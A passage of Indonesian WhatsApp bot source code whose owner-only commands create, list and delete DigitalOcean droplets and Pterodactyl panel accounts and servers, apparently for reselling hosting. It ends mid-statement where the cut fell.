Kenz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //==
/*case "shop": case "shopmenu": case "menushop":
 Kenz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 25000 * 1000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `

 👋 _*S H O P*_ 乂

> • _nokos_
> • _belisc_
> • _pulsa_
> • _transfer_
> • __
 
`,
 contextInfo: {
 mentionedJid: 'p',
 externalAdReply: {
 showAdAttribution: true
 }
 }
 }
 }
 }
 }, {})
let kupp = await Kenz.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let solsound = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `delever script`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Kenz;Bot;;;\nFN:Kenz Bot\nTEL;type=Mobile;waid=+62 851-3403-1285:+62 851-3403-1285\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
//Kenz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break*/
//===
case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================
case 'cvps':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.buyvps }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Populer",
 rows: [{
 header: 'Ram 2 & Cpu 1',
 title: "Membeli Vps Ram 2& Cpu 1",
 description: `Cocok Untuk Panel Pterodactyl Anda`,
 id: `.r2c1`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Ram 4 & Cpu 2',
 title: "Membuat Vps Ram 4 & Cpu 2",
 description: `.`,
 id: `.r4c2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Ram 8 & Cpu 4',
 title: "Membuat Vps Ram 8 & Cpu 4",
 description: `.`,
 id: `.r8c4`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Ram 16 & Cpu 4',
 title: "Membuat VpsRam 16 & Cpu 4",
 description: ``,
 id: `.r16c4`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Vps Digital Ocean",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Kenz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break
//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Kenz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Kenz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Kenz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Kenz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
